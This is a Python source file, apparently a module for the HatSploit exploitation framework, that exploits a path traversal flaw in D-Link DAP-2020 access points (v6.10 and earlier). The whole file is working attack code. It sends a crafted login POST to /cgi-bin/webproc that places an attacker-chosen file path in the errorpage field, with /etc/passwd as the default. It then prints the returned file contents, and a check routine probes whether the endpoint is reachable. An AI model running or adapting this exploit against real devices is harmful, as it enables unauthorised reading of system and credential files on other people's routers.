"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient
from pex.string import String


class HatSploitModule(Module, HTTPClient, String):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "D-Link DAP-2020 Path Traversal",
            'Module': "exploit/linux/dlink/dap_2020_path_traversal",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Path Traversal through incorrect login in D-Link DAP-2020 <= v6.10.",
            'Platform': "linux",
            'Rank': "high",
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 80,
                'Type': "port",
                'Required': True,
            },
            'RFILE': {
                'Description': "Remote file to read.",
                'Value': "/etc/passwd",
                'Type': None,
                'Required': True,
            },
        }

    def exploit(self, remote_host, remote_port, remote_file):
        response = self.http_request(
            method="POST",
            host=remote_host,
            port=remote_port,
            path=f'/cgi-bin/webproc',
            data=(
                f'getpage=html%2Findex.html&errorpage={remote_file}'
                '&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true'
                f'&obj-action=auth&%3Ausername=admin&%3Apassword={self.random_string(8)}'
                '&%3Aaction=login&%3Asessionid=365dfaef'
            ),
        )

        if response.text:
            if (
                    f"Pagefile open failed(File:{self.base64_string(remote_file)}"
                    in response.text
            ):
                self.print_error("Failed to open file!")
            else:
                self.print_empty(f"\n{response.text}")
        else:
            self.print_warning("File is empty.")

    def check(self):
        remote_host, remote_port, _ = self.parse_options(self.options)

        response = self.http_request(
            method="GET", host=remote_host, port=remote_port, path='/cgi-bin/webproc'
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port, remote_file = self.parse_options(self.options)

        self.exploit(remote_host, remote_port, remote_file)
